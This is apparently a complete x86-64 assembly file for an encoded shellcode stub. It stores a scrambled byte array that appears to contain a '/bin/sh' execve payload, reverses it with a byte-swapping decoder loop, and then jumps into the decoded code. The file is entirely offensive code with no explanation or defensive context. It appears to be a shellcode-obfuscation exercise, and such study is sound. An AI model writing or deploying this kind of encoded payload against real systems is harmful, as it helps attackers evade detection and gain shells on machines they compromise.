global _start

section _text

_start:

	jmp decoder
	code: db 0x05,0x31,0x3b,0x50,0x83,0xbb,0xe6,0x62,0x48,0x6e,0xe2,0x2f,0x48,0x68,0xe7,0x48,0x89,0x53,0x50,0x73,0x89,0x2f,0x57,0x69,0x89,0x2f,0x48,0x48,0xc0,0xc0,0x0f,0x48

decoder:

	lea rsi, [rel code]
	lea rdi, [rsi+1]
	xor rdi, rdi
	add rdi, 31
	xor rax, rax
	xor rbx, rbx

decode:

	; rsi stand for address of shellcode
	mov bl, byte [rsi + rax]
	push rax
	xor al, 0x10
	jz short code
	pop rax
	mov cl, byte [rsi + rdi]
	mov byte [rsi+rax], cl
	mov byte [rsi+rdi], bl
	dec rdi
	dec rdi
	add al, 2
	jmp short decode
